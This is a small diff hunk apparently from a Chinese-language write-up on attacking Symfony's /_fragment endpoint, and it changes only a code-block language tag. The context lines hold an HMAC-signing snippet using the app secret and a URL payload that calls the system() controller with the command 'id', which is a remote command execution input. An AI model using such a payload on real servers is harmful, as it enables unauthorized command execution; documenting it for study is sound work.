@@ -196,7 +196,7 @@ print(base64.b64encode(hmac.HMAC(b'{{APP_SECRET}}', b'http://localhost:8000/_fra
 
 如果要设置 `system($command)` 则如下：
 
-```textile
+```txt
  page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
 ```
 
